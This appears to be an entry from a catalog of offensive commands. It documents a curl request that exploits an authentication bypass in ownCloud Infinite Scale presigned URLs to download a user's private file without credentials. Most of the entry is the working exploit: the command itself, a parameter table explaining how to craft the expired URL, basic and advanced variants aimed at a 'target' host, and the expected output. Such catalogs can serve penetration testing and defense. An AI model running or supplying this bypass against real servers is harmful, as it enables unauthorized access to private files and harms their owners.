---
id: cmd-uuid-001
data: >-
  curl
  "https://localhost:9200/remote.php/dav/files/admin/secret.txt?OC-Credential=admin&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
tags:
  - exploitation
  - auth-bypass
type: command
output: secret file content
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T12:00:00Z'
updated_at: '2025-12-14T17:31:42.786Z'
verified: false
validated: true
submitted: true
---
# curl-owncloud-presigned-bypass

## Command

```bash
curl "https://localhost:9200/remote.php/dav/files/admin/secret.txt?OC-Credential=admin&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
```

## Description

This curl command sends an HTTP GET request to an ownCloud Infinite Scale DAV endpoint using a crafted PreSignedURL with an expired OC-Date, bypassing authentication to retrieve private file content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full PreSignedURL with query params | Yes |
| OC-Credential | Username for the target file path | Yes |
| OC-Verb | HTTP method (GET) | Yes |
| OC-Expires | Expiry duration in seconds (e.g., 60) | Yes |
| OC-Date | Expired ISO timestamp (e.g., 2024-01-27T00:00:00.000Z) | Yes |
| OC-Signature | Invalid placeholder (skipped on expiry) | Yes |

## Examples

### Basic Usage

```bash
curl "https://target:9200/remote.php/dav/files/admin/secret.txt?OC-Credential=admin&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
```

### Advanced Usage

```bash
curl -v "https://target:9200/remote.php/dav/files/user/file.txt?OC-Credential=user&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-01T00:00:00.000Z&OC-Signature=invalid" -o output.txt
```

## Expected Output

The command returns the raw file content (e.g., 'secret file content') with HTTP 200 status, without requiring authentication due to the expiry bypass.

## Related

- [[Related Procedure: Craft-Expired-PreSignedURL-for-Auth-Bypass]]
